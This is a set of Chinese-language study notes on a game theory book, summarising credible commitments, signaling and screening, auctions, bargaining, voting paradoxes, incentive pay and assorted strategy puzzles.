如果威脅太大就不用執行，但是如果遇到真的要執行的那一刻可能就很尷尬(像丟核彈) 這是因為我們不知道應該提出多大的威脅，對此人會盡可能壓低威脅的規模，讓真的做的時候的代價降低\n因此應該從小威脅開始，一步一步慢慢上升，又名邊緣策略 像是在在審問時，左輪只塞一顆子彈，之後只要每一次對方不吐實就扣一次板機，讓風險上升(與膽小鬼賽局很像)\nch7: 提升可信度 如果單憑言語就想影響其他參與者的信念與行為，那麼這些言語一定要有適當的策略行動支持\n改變賽局報酬 (使破壞承諾的代價高於遵守承諾的代價) 2. 把威脅變警告、把約定變保證 2. 寫下合約來支持你的決定 3. 同意在違背承諾時接受懲罰 4. 要預防再談判(或是重寫合約) (負責執行承諾的人必須具備某種獨立的動機來完成自己的使命) 5. 想要減肥所以立約，只要有人抓到偷吃東西就可以拿到$ 6. 但如果立約人求情的話? 想用請客躲過這一次? 7. 可以依賴第三方 (像法院、信用機構) 8. 無法完全防止再談判 9. 如果雙方都想改的話 7. 適用於商業行為 8. 因為受害方一定會吵，因為重要的是貨物不是合約的補償 4. 建立與運用聲譽 5. 什麼時候用聲譽 6. 在同一時間與不同對手進行多個賽局 7. 在不同時間與同一個對手進行多次賽局 8. 建立方式 9. 有人知道(直接為人所知、透過傳言) (像公開聲明) 9. 實施強硬行動的證明 10. 經過測試 改變賽局，使你背棄承諾的能力受到限制 5. 切斷聯繫: 我無法干涉我之前做過的決定 6. 讓行動不可逆轉使其變成可信 (像遺言、遺囑) 7. 困難點 8. 如何確定對手會不會照遺言走? (我有可能沒辦法監督) 7. 破釜沉舟: 切斷自己的退路 8. 膽小鬼賽局的丟掉方向盤 9. 讓結果失控或聽天由命: 執行回應規則與判定違規的不是我 10. 奇愛博士的末世毀滅機 (但一次把世界毀了就太過了) 11. 改用邊緣策略!! 結合前面兩個 9. 分割大承諾，讓破壞小承諾的收益不足以抵銷違背其他承諾造成的損失 10. 小步前進: Divide And Conquer 11. 一次買100公斤的古柯鹼有做背叛的價值 12. 分成一次1公斤做100次 引入第三方 12. 透過團隊來建立可信度 13. 團隊的成員之間會互相監督 (互相牽制) 14. 戒酒團體 15. 連坐罰 16. 只懲罰犯錯的其他人可以忽略或是打掩護 17. 但連同忽略或是打掩護一起罰就不一樣了 14. 雇用代理人 15. 前面有提到執行回應的代理人 16. 同時還有負責談判的代理人 17. 像是與朋友或是有親密關係的談判，當事人去談就可能退讓 18. 或是設立規則給當時談判的人 19. 政府機關的標案的相關規則 降低對手的可信度\n合約: 訂新合約 聲譽: 保密 3. 聲譽只對公開的場合有用，所以只要保密說這是兩人的事就好 破釜沉舟: 不要把敵人逼到絕境 5. 讓對手有安全退路的錯覺，避免殊死戰 溝通: 只要對方收不到威脅或是約定，任何策略行動都沒用 7. 小孩如果哭太大聲，就算父母說再哭就沒飯吃也沒用 小步前進: 臘腸戰術 9. 一小步一小步的違反對方的威脅 雇用代理人: 要求直接與當事人談判 保證書店回購二手書會降低學生購書成本? 出版商想從每一位學生上賺30元，但如果這本書會被二手書交易2次，這樣出版商要一次從第一個人身上賺90元 同時，也會讓出版商盡快推出新版本或修訂版，削弱二手書 於此，如果是最後才買到的人遇到新版本推出一定很嘔，所以當學生預期這時刻快到的時候可能乾脆不買書 到此可以看到消滅二手書市場對學生與出版商都比較有利(除了書店)\n另外，就算保證書店回購二手書，書店還是可以壓低價格\n改成出版商承諾不會出修訂版，同時學生不賣二手是一種解法 或是向出版社租教科書，同時付訂金保證出版社一定會把教科書拿回去，同時把二手書市場消滅 (承諾問題的解法，租賃代替銷售)\nch8: 訊號 大部分時間，人的利益與他所表達的話語是一致的\n利益衝突越大，可信的資訊越少。 對於這種對手的所有言論，唯一的理性回應是完全忽略對手的所有言論 不要以為他是真的，也不要以為他不是真的\n要思考賽局的均衡採取相應的行動\n行動勝於語言 某些人知道的其他人多，同時這些資訊會對賽局產生影響，影響所有人的報酬\n知道額外資訊的人試圖隱藏訊息 有渴望真相的人 具有較少資訊的人希望從知道的人套出實情\n這時唯一可以信任的是行動 再知道別人會以某種方式理解自己行為的情況下，每個人都應蓋針對對方的資訊內容，反過來操縱對方的行為\n訊號傳遞: 選擇洩漏對自己有利資訊的行為 (只有他有這個訊息，做這件事對才是有利的) 訊號干擾: 採取行動以減少洩漏或避免不利資訊 篩選: 設計一種環境，讓他發現再持有某種訊息下才去某種行動是最好的，而在另一種資訊下才去另一種行動是最好的 或是同一行動因為具有不同資訊導致最後報酬不同\n為了使行動成為有效的訊號，行動不能被其他騙子模仿 如果真相與你想傳達的訊息不同，這樣就算他們模仿你的訊號也得不到好處\n二手車如何傳遞我的車品質很好? 提供保固\n假設保固一定有效，設定\n好車的修理費: 500 壞車的修理費: 2000 而一般有保固價差在800\n這時如果賣家知道自己的車很好可以提供保固，賣家可以多賺300；但壞車的賣家就不行\n反過來，買家想要知道車子好不好可以提議，加800多給保固 (其實可以從600開始喊到2000為止)\n在此保固可信的理由是好與壞的維修費之間的價差太大了!!\n劣幣逐良幣 設定一個二手車市場\n壞車 賣家底價: 1000 可能出價: 1500 好車 賣家底價: 3000 可能出價: 4000 照效率市場來說，好壞車都能在1000~1500與3000~4000中出售 但是只有賣家知道自己的車好與壞(資訊不對稱)，假設買家只知道好壞車各佔一半，所以\n平均出價是0.5*(1500+4000) = 2750\n這個價格比好車的賣家底價還低，這樣就變成劣幣逐良幣\n而現實市場有其他手法對應這個問題\n找懂得區別好壞車的人 確認賣家的賣車理由 家人變多要換大車 搬家 逆選擇與正選擇 剛剛劣幣逐良幣是吸引賣家\n這裡是吸引買家 看保險業，通常風險程度越高的越會去保險，但如果只是提高價格，反而會嚇跑風險小的客戶，這是逆選擇\n正選擇是透過規則選出希望服務的客戶 像是信用卡餘額轉移服務，信用卡客戶分成\n當期全繳 分期繳完 卡奴 第1,3種賺不到錢，第2種可以 所以這個服務讓想要分期的人有更大的空間，自然就吸引第2種人了!!\n消滅資訊不對稱的代價: 要花多少雇一個MBA 假設\nMBA要花20萬(包含學費與上MBA沒拿到一般pay的機會成本)，之後花5年還完 一般pay是50000 這樣要花多少雇MBA? 20除以5是40000 所以公司每年至少要多給40000，書上再多給10000也就是雙倍一般pay 而這就是資訊不對稱的代價\n假設能僥倖過MBA的機率是50% 這樣對於沒把握過MBA的人來說，MBA能帶給他的平均收入是25000，而只有這樣沒辦法在5年還完MBA的錢\n但如果多給到80000呢? 80000乘一半是40000，這樣剛好可以還完MBA的錢!! 如此一來就不能嚇阻僥倖過MBA的人\n其他消滅資訊不對稱的方法 (這裡是類似請領工傷補助的情境)\n檢查、監督 (成本高) 申請人長時間填表申請 如果時薪高的就會自動退出 實物津貼 直接給需要的東西，像是不能走就直接給輪椅，不是給錢讓他去買 不傳送訊號也是一種訊號 課的評分分成\n合格與不合格 A+,A,A-,B+,\u0026hellip;. 如果學生知道自己能拿到A+差不多的分數，一定會選用第2種評分方式的課 這樣一來，使用第1種方式的課只會剩下不太好的學生 對此，如果其他人(面試官)來看會認為，他如果不選第1種評分方式的課就是表示他想隱藏他能力不好 就算他有可能能力其實超好\n記住，做任何事都會傳遞訊號，不做也是一種訊號\n拒絕傳遞訊號 主要理由是區隔，像是面試通常要穿西裝，但是如果只穿牛仔褲，不是對方不懂禮節，就是她其實不需要那些禮節\n你能出多少錢? 差別訂價 有人不在乎出多一點錢，有人在乎，要怎麼從他們手中賺最多的錢? 出不同版本，豪華版與閹割版\n這裡來看一個航空公司(這裡叫PITS)定價的故事，reserved prices是使用者的出價 現在PITS要從使用者的出價中找出要給普通票與特級票多少錢 基本上的目標是商業客都買特級票，一般客都買普通票 (需要資訊篩選，所以下面要透過價格來完成)\n特級票先訂最高的300，普通票定140\n從商業客的角度來看，他們願意花225買普通票，這樣還有剩下85(225-140)可以花 這就是消費者剩餘，出價與定價的差\n而300元除非能夠多提供達85元以上的價值的服務，不然商業客會選普通票 所以特級票要反映這個消費者剩餘，最後定價是215(300-85)\n這種壓低特級票價，讓商業客去選這個票的策略叫激勵相容約束(incentive compactibility constraint)\n我航空公司，PITS，想從商業客賺多一點，要怎麼做? 去調商業客的消費者剩餘，像是從85變成60，所以這樣特級票價變成240 但是連帶普通票價就會變成165(225-60)\n然而140是一般客的出價，165明顯高於這數字，我們這樣會失去一般客!! 這是一般客的底線，又叫參與約束(participant constraint)\n最後PITS應該把價格訂成140, 215\n如果商業客的比例(原本是30對70現在變成50對50)比較高，其實可以犧牲一般客!!\n納入一般客: (140-100)*50+(215-150)*50 = 5250 我們不要一般客: (300-150)*50 = 7500\nch9: 選擇會外溢，所以需要合作(公共政策)取代均衡 相對的成功 第一名的成本到底多高? 如果每個人都很努力就要花很大的力氣才能get第一名\n所以只要大家都不讀書就好，因為排名是相對的，一定有第一名 這點與企業聯盟一樣\n這裡有一個有趣的例子，之前香菸還可以打廣告時，大家花大錢在行銷上 之後政府禁止，反而讓公司利潤大幅改善 第三者的集體協定讓企業聯盟反背叛運作良好\n均衡不是最優 BART(捷運)不論多少人都是走40分鐘 橋一般是走20分鐘，但每多1000人就多10分鐘 均衡是橋配4000人，剩下都BART，這樣所有人都是走40分鐘 但這樣是最好的嗎? 如果把橋配2000人，這樣可以省下，10分鐘*2000人 = 20000分鐘 因為每多1人就是造成別人不便，但是多的人不用付出代價，受傷的是在之前在橋上的人\n那怎麼維持這個模式?\n發2000份通行證 定價 設定，1小時值12元，所以10分鐘值2元 捷運票價是10元 橋的過路費設成12元 標上價格才能透過他達成新的均衡，才能用看不見的手\n該超速嗎?\n如果其他人都超速，妳為了安全必須超速 跟在別人後面比較不會被罰 與前面的BART例子比，這裡不會收斂在均衡點，反倒是會往兩邊(極端走) 因為走橋會讓橋的吸引力下降，但超速或是守法，只要人越多越有吸引力\n所以要怎樣才能達成守法? 讓大部分的人守法就好，所以可以訂重罰，不用把速限拉高\n歷史的力量: 積習 x軸是總共有多少打字員用QWERTY鍵盤 y軸是新打字員學QWERTY鍵盤的比率 中間的對角線是使用QWERTY的平衡點(可以想成y軸是in，有多少新血，x軸是out，現存的人) 曲線是有多少人用對到會有多少人學 (from 隨機逼近理論)\n起初有大量的QWERTY(所以在98)\n有3個均衡點 0,0 72,72 98,98 只要超過均衡點就是指數往上或往下 (這均衡十分脆弱) 只要超過72就是往98前進 低於72就是往0衝 從眾讓我們得到這種結果 (目前大多人都是QWERTY) 想要丟掉QWERTY十分困難 但還是有機會 大廠或是大戶一起投入新鍵盤 像消滅3.5mm 也就是說，沒必要改變所有人，只要改變起關鍵性作用的部分就好 其他例子是汽油引擎、輕水反應爐，都是早期大量投入，導致後面無法翻轉的例子\n別讓它引爆 這裡來看黑人與白人社區的形成\n與QWERTY類似的圖，但是極端是0或100 均衡在input等於當前的比例的時候，這裡中間是在70\n同樣的，這是脆弱的平衡，更壞的是，基本上一但到了極端就回不去了(遷徙自由)\n所以要怎麼阻止?\n禁止放上出售的牌子 (延緩引爆) 提供保險保證不會因為混居比例改變而讓房屋價值下降 (阻止因為預期而導致的引爆) 危險的斜坡 書上的例子是有一群人要爭一個高位\n透過每年評分(滿分10分)沒有到門檻就out，現在可以透過投票設定門檻\n有人設定成2，這樣會有\n分數為2的反對 剩下都不會反對 比2高: 不用反對 比2低: 如果反對會被看出來自己的分數比2低 這種情況會一直持續，直到有人設定11分，讓所有人都搶不到\n投票中只有唯一一個剛好的人承受所有損失，所有贊成者只有一點點好處，就讓這投票一路往前，最後一次引爆帶所有人下去 只有一個人意識到這個問題沒用，因為他不一定可以阻止這個過程\n書上有一個例子是議員想加薪，但是遇到民眾反對，所以有人就想只有我投反對應該還是會過 最後，案子一直過不了，隨著一次一次過不了(一直一直修正)，反對的理由越來越充分，加薪就無望了\n打從一開始就不該開始這種事情，這需要大家協調才能避免，一次把事情處理掉(讓所有人都知道自己最後會在哪)，不是分成小步小步 不然，這樣只要出現一個巨大的失敗可以把前面所有東西都吃掉\nch10: 競價，當成你已經能得標後，別人會怎麼出價 最一般的競標\n英式拍賣 想喊的就喊，直到沒有人要喊，用次高價成交 最佳策略 超過自己的估價(超過一分就想轉身離開的數字)就退出 估價的要素 共同元素 (油田的油含量) 私人元素 (自己的採油技術) 還有誰在競價 (一張不起眼的椅子卻有知名家具商出高價競標!?) 有多少人在競價 其他人什麼時候退出 英式拍賣只會看到 共同元素 \u0026amp; 私人元素 日式拍賣 想要就手舉著，直到價格漲到受不了就手放下，成交價是倒數第二位放下時的價格 最佳策略 同上 日式拍賣能看到上面所有估價要素 維克里拍賣 寫下自己的出價，由出價最高的人get，付第二個高的價格 最佳策略 同上 3個都是 出價最高得標 給次高價 在私下的競標中 別人的訊息不重要 不論用哪種拍賣最後的成交價都一樣 買家的溢價 (多抽平台費) 看起來是買家要付，但其實是賣家要付 因為買家可以先把這段算進來，買家最後出價都一樣，但到賣家的錢變少 如果還有其他差不多的東西也同時在競標\n線上競標 流程與維克里拍賣類似，但是是程式幫跑 估價多少? 如果自己估400元，其他類似的出現250元 現在估價也取決於其他相似的代售物品 狙擊出價 到最後一刻才出價 因為大部分都不知道自己的真實估價 向前預測，向後推理\n像一個結果導向主義一樣行動 在一開始就以終為始，然後才行動 避免贏家的詛咒 假裝已經得標後開始思考這個數字 假設我們要買一家公司 前提 預測市值是200~1200 我們有能力讓他的真實市值變1.5倍 現在問題是我們最高只能到多少才不會虧? 贏家的詛咒 直接求中點加上1.5倍: 700*1.5 = 1050 如果對方接受，代表真實市值在200~1050 假裝已經得標後，接著算 我們需要一個數字是求中點加上1.5倍不虧的數字(均衡點) (200+x)/2 * 1.5 = x 答案是600 密封競價拍賣 維克里拍賣，但付自己寫的價格 最佳策略 比自己的估價低一點 (才有賺) 同樣要利用前面的方法來看自己的出價 荷式拍賣 與日式相反，從最高往下掉，直到要的人叫停 最佳策略 同上 收益等值定理\n估價在私密且對稱的狀態下 不論任何拍賣 賣家通常都會拿到相同的錢 所以把自己的估價當成最高的 之後用你認為的第二高來出價 (你下一個競標者的最高出價) 不論另外設定各種規則 買家都有辦法把相關成本回給賣家 或是說買家會根據規則調整出價 買家會根據規則調整出價，所以賣家通常都會拿到相同的錢\n國債拍賣 (總共1億) 一開始是挑最低利率的得標 只有紅線以上的得標 後面改統一利率，如果延續前面的表格就是所有得標者都是3.72% 這樣不是更不好嗎? 這是因為這是前面的拍賣方式 如果改成統一利率，會有不同的出價，反正 賣家通常都會拿到相同的錢 但這樣調出價這就不用思考太多 類似出價的賽局\n先佔賽局 先出手才有機會得到市場，但失敗就gg，所以要什麼時候出手? 同時出手 太早出手如果失敗就gg，晚出手就gg，剩下就是同時 這還是沒講時機啊 你成功機會與失敗機率相等的時候 你成功是他失敗 他失敗是你成功 這不就是同時出手 消耗戰 看誰hold比較久，有最佳策略嗎? 沒有 你認為他們要停了就會繼續忍 它們認為你還要忍他們就會忍 loop 你的出價策略完全看對面 但實際上根本沒辦法知道!! 只能與對方協調，中止這個賽局 競標頻譜執照 (很神)\n現在有兩個執照，NY,LA 只要有針對比較低價的可以選擇加價(本來就比較高的就不用動) 直到沒有要加價為止 每一家最多一張 下圖是兩家公司的估價 ver1 AT\u0026amp;T直接抄MCI的底價，這樣AT\u0026amp;T在賺1元(另一張讓給MCI，但MCI沒有賺) ver2 AT\u0026amp;T在NY出1，另一個出0 這樣MCI會怎麼出，別忘了他們不是要帶一張不然就是因為到了底價而停止 NY出0，另一個出1 這樣AT\u0026amp;T賺9元，MCI賺8元 這裡很有趣 如果改成一般的一張一張競標就不會有這種結果!! 電信商不能沒有帶走任何一張，但又有不同的地區偏好!! 變成所有競標都要好好投入，但又怕沒錢撐到想要的執照 把兩個賽局合併就能產生處理兩個賽局的策略!! 如果你不喜歡現在的賽局，那就尋找更大的賽局 ch11: 討價還價 aka 怎麼算餅多大\u0026amp;怎麼分餅 假設\n酒店一天賺1000 輪流提要求 資方只能yes/no 只能明天給回應，只有共識才能開始賺錢 向前預測、向後推理\n實際發生的事情應該從這個邏輯推到極致來思考 從最後一天開始，看怎麼分剩下的錢 (total: 1000) 公會提拿1000，資方0 資方也只能接受，都最後一天了 往前一天 (total: 2000) 資方提拿500，公會(1000+500) 資方知道如果到最後一天，工會會拿到1000 所以現在的部分對半分 再往前一天 (total: 3000) 公會提拿2000，資方1000 從前一天的基礎上今天對半分 因為工會在最後一輪有全拿或全失的提議方，所以最後一天可以全拿\n但這個優勢隨談判回合多就不明顯\n看看一開始，雙方的錢幾乎一樣 這個告訴我們一個簡單的法則: 對半分(split the total down the middle) 在剛剛的例子中，雙方的大餅是剩下的天數\n而決定怎麼分餅，是看\n各方的等待成本 看有什麼辦法可以抵銷沒有共識的損失 像是以前面的例子來說 如果員工可以在罷工時起賺到300(一天) 這樣原本的1000中就要先分給工會，不然比300低就沒有共識的價值 如果資方有辦法策動一部份人使店可以重新開始營業賺到500(一天) 這樣原本的1000中就要分500給資方 這樣一套下來，餅剩下多少? 1000-500-300 = 200 剛剛提到的300與500，就是雙方的協議最佳替代方案(BATNA, best alternative to a negotiated agreement) 無共識的最佳方案 所以整個談判的關鍵是 (餅是?) 共識的價值比各方的無共識的最佳方案總和還要多多少 要出多少機票錢?\n2家公司都請了同一個律師，現在飛行路線是一個三角形，試問兩家公司要怎麼分總機票錢? 加總平分? 只平分中間段? 從BATNA來看 如果雙方沒有共識，律師就要兩個點到律所來回 這樣就是2486+1332=3181，但三角形路線的總和是2818 所以只要有共識(使用三角形路線)，就能省下1000 2家公司平分這1000，之後扣回去變成各付 2486-500 = 1986 1332-500 = 832 只要他比我痛苦就好\n從BATNA來看，只要BATNA越好能吃到的餅越多 所以可以想辦法(威脅、承諾)調整雙方的BATNA 威脅、承諾可能讓雙方的BATNA變少，但只要最後談判可以拿到更好的結果就ok 對對方的傷害更大 像員工阻止資方營業，最後員工200，資方只剩下300 這樣餅剩多少? (1000-200-300) = 500 這樣公會拿200+250 = 450 (原本是400) 資方拿300+250 = 550 (原本是600) 如果都知道早點對半分比較好，為什麼還會罷工?\n談判因為人為因素(情緒、各方的BATNA、懷疑)容易導致誤解 各方對成功的定義不同 各方必須猜對方的等待成本(BATNA) 為了證明自己的等待成本低，所以開始製造成本 正是對於談判何時應該結束沒有共識，才導致罷工 這就是邊緣策略，一路從往破滅的方向走 (很像膽小鬼賽局與消耗戰) 重點是讓發生的可能性上升的fu讓另一方退讓 罷工的其他點\n同時談多個爭議 各方重視的不一樣 像醫療保險，個人去買會比較貴，但公司去看可以拿到更好的價格 但也有可能變成在其他方面談判的籌碼 虛擬罷工 照常營業，但是當天的所有收入都捐出去 重點是雙方都不會拿到錢 長期利潤難以衡量，所以公司也有可能低估短期的成本 等到雙方都很苦後，就會想好好談了 同時，其他人還有好處 啟動時間點在雙方還在談判的時候 RUBINSTEIN BARGAINING 設定δ是折舊的比率，L是我們最低可以接受的比率 假設我們今天拒絕，這樣對手明天能到最多δ(1-L)(所以他們明天一定要接受)，所以明天能拿到1-δ(1-L) 對此，今天我們的底線就是δ(1-δ(1-L)) 同樣假設我們今天拒絕，M是我們的上限(超過直接接受)，利用對稱性，對面的最低是δ/(1 + δ) (這時在明天) 所以我們能拿的是1-δ/(1 + δ) (這時在明天) 所以今天我們能拿的是δ/(1 + δ)\n這很神奇，如果雙方都很能等(δ為1，也就是不會隨等待貶值)，這樣比率就是0.5!! 如果折舊是0.5，最後數字是1/3 想像一個割派的情況，但每次都輪流拒絕，而對手可以拿到剩下的部分 所以第一局對手拿0.5，第二局你拿0.25，之後一直除2，但對手總是拿到你的2倍!! 所以比例是2:1就是1/3\nch12: 預期 與 投票 投到最後反而是我不想要的上了!? 人們預測某個候選人很穩，就會把票給他們推崇的極端候選人 最後很穩的候選人 與 極端候選人都一起出局 同時人不想把票浪費在保證不會上的人 所以民調重要 票只有在打破平局才有價值 當我們的票無關緊要時，可以隨意投票 當我們的票意義重大時，就要策略性的投票 當真相無關緊要時，我們才能說出真相 有辦法避免策略性投票嗎? no 所以只能從各種方式中去挑 多數決的缺陷 有3人 Mr. Robespierre (R), Mr. Danton (D), Madame Lafarge (L) 如果抓出任意2人做多數決，會發現彼此互剋!! (三角形) 可以改成取差距大的多數決優先 R對D是75對25 D對L是65對35 L對R是60對40 這個差距不大所以不算 這樣就變成 R \u0026gt; D, D \u0026gt; L 換個視點成R最多只有60票反對，D是75，L是65，所以R勝利 取最多反對票的候選人中的最少票的原則 康多賽投票規則 缺點: 要投很多票!! 可以改成讓選民寫下排名 但上面的例子如果用當前法國的制度? 第一輪選兩個(除非有人拿絕對過半的票) 第二輪一般多數決 這樣結果變成 第一輪剩下R與L 第二輪D的支持者投給L L勝利!! 如果R的支持者意識到這件事 就會策略性投給D 但這樣D會直接過半!! 在存在投票循環的狀態下，投票結果對投票程序高度敏感 怎麼判刑? 3種做法 現行制度 先看有沒有罪，之後量刑 羅馬傳統 從最重的罪往下看，如果都沒有最適合就無罪 強制判刑 先量刑，之後看有沒有罪 現行制度 如果選有罪，之後就一定是死刑 所以這一開始就是選死刑或無罪 最後無罪 羅馬傳統 如果決定死刑，就不用再看了 如果決定不要死刑，就變成無期確定 所以這一開始就是選死刑或無期 最後死刑 強制判刑 如果決定死刑，最後就是無罪 如果決定無期，最後就是無期 所以這一開始就是選無罪或無期 最後無期 選民如何影響候選人 所以選民為了讓整體傾向自己的立場，要變的極端 假設 0~100表示保守程度，當前偏保守，60分 你是中間選民，50分 如果說出真實意象，最後落在59.9 如果極端，最後落在54.9 對此，候選人會根據各方的選民數量做出妥協(平均) 會變成這樣是因為平均會考慮到 立場 強度 (所以變得極端) 如果要處理這問題就是讓候選人採取中間立場 (政黨也是) 這樣選民沒有必要極端 一路從左開始往右走，直到左右力量相當 如果有對手? 像是對手選48，這樣在任者只要選49 像是對手選51，這樣在任者只要選50 but，這只有在單一議題有用 為什麼憲法要2分之3才通過? 延續前面的中間立場的問題，如果有多個議題的話? 變成現任者要選一個最中間的位置 重心 這個與兩人分蛋糕有點像 一個切，另一個選 但現在時現任者壓住一個點，給另一個人切 看上面的三角形，只要現任者在重心，不論挑戰者從哪邊攻擊 現任者一定有4/9的小三角 如果繼續推到多維 保底都有1/e比例的選票，大約36% 就算選民常態分布不是平均分布 也就是說，至少要64%才有辦法撼動現任者的地位 所以憲法選2/3確保不會那麼常變動 預期使我們扭曲 我預期A會上 所以我可以投給B，因為A少我這票沒差 我預期A與B不應該上 如果A有其他人會投導致他會上，我應該就要投B，保證公平 先手必勝 兩個基金會各有25萬 可以給 遊民 A大學 B大學 雙方都覺得遊民最重要 但有各自偏好的大學 如果A基金會希望給A大學多一點預算，但不損及遊民，要怎麼做? A基金會先把25萬都給A大學 這樣B基金會只能撥20給遊民，5給B大學 原本可以雙方各出10給遊民，這樣大學各有15 因此A基金會的搶先行動，搶了B大學的10萬 你可能願意冒著失去你想要東西的風險來得到更多好處 只要你還可以指望別人會來幫你挽回顏面 如果你可以指望別人在意後幫你挽回局面 那你就有動機去扭曲你的真實偏好 利用其他人的真實偏好增加你可獲得的好處 ch13: 激勵: 買努力 aka 怎麼測量努力，買努力的保證 道德風險 想驗證有沒有認真做事 自己下去再做一次? 那幹嘛分配工作 為努力付款 努力不好被觀測 報酬無法直接以努力為基礎，報酬只能與某種結果綁定 結果的組成 努力 運氣 讓多個員工做同樣的工作 互相成為比對的基準 同樣的書稿讓多個學生debug 第一個找到bug的有錢 固定獎金 我可以假裝有做事，最後說因為場外因素失敗 按價計酬 如果自己能做的不多，這樣參與的意願就不高 想是為已經到第三版的書挑錯 所以要混和使用 錢不能太少，太少乾脆不要 太少會傳出一種這件事不重要的訊號 其他付款方式 非線性(門檻) 不能太高 如果打從一開始就不可能，那還要做嗎 不能太低 有設與沒設一樣 胡蘿蔔與棍子 基本工資: 參於約束 低工資: 棍子，要好好工作才有基本收入 高工資: 胡蘿蔔，好好工作會有獎金 好壞績效之間的利差 利差越大越有效果 效率工資 (效益溢價) 假設 外面的行情價: 40000 個人的努力費用: 8000 發現偷懶的機率: 25% 工資要多少才能確保他不會偷懶且努力? 第一個是買他的努力: 48000 (抓到偷懶就沒有) 第二個要多加多少才會讓他認為偷懶不值得 X為抓到偷懶之後每年要失去多少，沒有抓到就給他 有25%的機會被抓，0.25X 乘上利率，先當成10%，0.25X*10 所以偷懶一次8000，之後每年失去0.25X*10 8000 \u0026lt; 2.5X =\u0026gt; 3200 如何設計工資 假設 完成遊戲的收入是20萬 雇一個一般工程師5萬，成功機率60% 雇一個專業工程師7萬，成功機率80% 工資要開多少 先看要請誰 20萬 * 60% - 5萬 = 7萬 20萬 * 80% - 7萬 = 9萬 找專業的 獎金給多少 我們不知道他有沒有認真，這是創意性的工作啊 只能從最後成果下手 一般與專業的成功差距是20%與2萬 獎金: 2萬 / 20% = 10萬 要給多少 10萬獎金如果給一般的來做有60%成功 偷懶的預期收入: 10萬 * 60% = 6萬 基本報酬: 一般的行情價 - 偷懶的預期收入 負1萬 所以 失敗: 負1萬 成功: 10萬+負1萬 = 9萬 平均支出: 80%*9萬+20%*負1萬 = 7萬 boss的平均收入 20萬*80% - 7萬 = 9萬 可以看成用50%的股份換工程師的努力與1萬 20萬*80% + 1萬 = 9萬 成功獎金就是公司的一半 不能用罰金的話? 找近似的獎金制度 像把失敗的錢變成0，這樣平均支出變成8萬，boss的平均收入也變成8萬 但這樣努力的難以觀察程度就會有影響 之前因為是剛好7萬是可以直接反應可以直接看到工作品質高低的數字 分紅或配股 風險問題 可能因為風險導致估價低於平均支出該有的價格 只能妥協，接受可能有低努力的結果 員工有多的風險就要有補償 ch14: 各種小故事 該交換嗎 現在有5, 10, 20, 80的信封，給兩個人，之後讓他們確認有多少錢，最後給一次機會可以與對方換。 他們該換嗎?\nno 你拿80就不用換 對方想跟你換，代表對方一定不拿80 如果你拿20，你也不用換 你拿10或是5也不用換，因為對方會想到這點，也不會更你換，除非他拿得比你低，但這樣你也不用換了\n先行者劣勢1 現在到最後一局，A與B各有700與300，之後他們在轉盤上對賭，最後有最多籌碼的贏\nB梭哈300到3的倍數上(賠率是2比1)，A應該怎麼應對(壓紅或黑與壓多少)\n如果B想贏超過A應該怎麼做\n壓3的倍數300(照做)，這樣不論贏或輸，對方的總和絕對不會超過A\n假設A下200在紅色(賠率是1比1)，這時B應該壓黑色300，只有贏他才是獲勝的唯一可能\n先行者的劣勢是會暴露你的行動\n先行者劣勢2 現在有3人做決鬥，3人準度分別是\n30% 80% 100% 決鬥分兩階段，每階段各有一次開槍機會，問怎樣第一個人的生存機率最大\n這與第一章的以退為進很像，他應該放棄開槍，讓其他人決鬥，因為它們都想幹掉對方 最後就是看第一位的30%能不能打到了\n弱者透過讓出自己的第一次機會可能得到較好的結果\n先行者優勢 現在有個遊戲，挑一點之後把從這點到右上的所有點拿掉，剩下最後一點的輸\n怎麼證明先行者有取勝策略\n不論後攻怎麼拿，先攻都可以直接做出來 所以就算後攻有取勝策略，先攻一定可以優先開局\n沒有什麼事情是後攻可以對先攻做，而先攻不能搶先做的\n囚徒困境來收購 有一家族企業，為了以後不讓企業被其他人吃掉，所以在董事會議程加一條 提議通過需要過半，如果提議未通過，提案者與附議者就是解除董事職務，並將其股權平分給其他董事 投票是轉一圈，看同不同意\n當然最後一定被收購了(提案者有51%)，how?\nhint: 使用向後推理，以終為始，確保最後兩位有動機投同意\n過 一個人投不同意 照規則 每人get，``20% / 5 = 4% 二個人投不同意 除了規則，加上提案者的51% 有過，12.25% / 3 + 51% / 2 = 29.8% 沒過，(12.25% + 51%) / 3 = 21.1% 所有人同意 都給錢，由自己指定新董事會 不過 不用考慮 囚徒困境來收購2 現在有人要收購公司，分兩階段，50%之前都是105一股，超過50%後就是90一股，當前股價100一股 如果收購成功， 收購失敗，就回去100 所以要讓出嗎?\n要\n低於50%與剛好到50%，都會拿到105，所以要出讓 高於105，如果不出讓這樣最後變成90，但出讓至少還有97.5 但這裡有趣的是，因為照這樣所有人都會出讓，這樣均價變得比當初的當前股價低\n老實沒有好處 手機費很複雜，都不會把所有該寫的都寫出來，why?\n如果真的列出來，這樣就一定要在其他地方做出彌補(因為消費者都會知道哪邊要避開) 最後就是與其他看起來比較低的相比，變得不利\n另外，消費者也預期公司一定會有另外的費用，如此一來老實的除了貴還是貴 最慘的是，消費者也不知道對手的真實收費如何，所以也無從比較\n最後整個變成，前面看起來很便宜，之後很貴；所以公司都要比看起來便宜，去反覆地搶客與被搶 利潤就花在這個地方\n一個方法就是立法規定廣告的價格必須是包含所有費用，像書就是包含運費與保裝費\n為孩子定價 舊式所羅門王的找誰是真的媽媽的故事，但現在用罰金來處理 但罰金要\n夠高 真的母親要付得起 確保小孩會來看我且不會搞 父母最後可以用遺產來讓小孩們做點事，想回來看看父母\n所以他們定，如果沒有看夠每周的次數，那該小孩的遺產就平分給其他乖乖的小孩\n但之後所有小孩合謀，都不會去看，因為他們知道父母絕對會把遺產給他們\n對此要怎麼做才能讓他們守規矩，同時不能把遺產給別人或拋棄\n如果真的發生，就把所有遺產給看最多的小孩\n一美元的價格 現在競標一美元，但特別的是出價最高與第二高的都要給他們出的價，最高的get這一美\n這要怎麼玩\n打從一開始就不要玩 因為出價最高與第二高的都要給他們出的價，所以一旦不幸成為第二就要去追第一，之後loop 直到沒錢可以玩的時候\n另外一個方式是共謀，一個人出一個單位的錢，剩下的人不出，這樣就是其他人的獲勝了\n要等多久 假設一個橋，7點半到11點會出現壅塞，一台車9點加入車陣中，請問他產生的總等待時間多長?\n11-9是2 可以想像成這台車每開上橋，在旁邊等到壅塞結束要多久 用一輛車看出總等待時間\n不論如何吃角子老虎機都很坑 業者稱他們的其中一台機器的投報率大於1，我們能猜出是哪一台嗎\n應該不能\n投報率是只吐出累積獎金的機率，就算投報率高，但看到一直沒有回報，一定會被認為是不好的機器 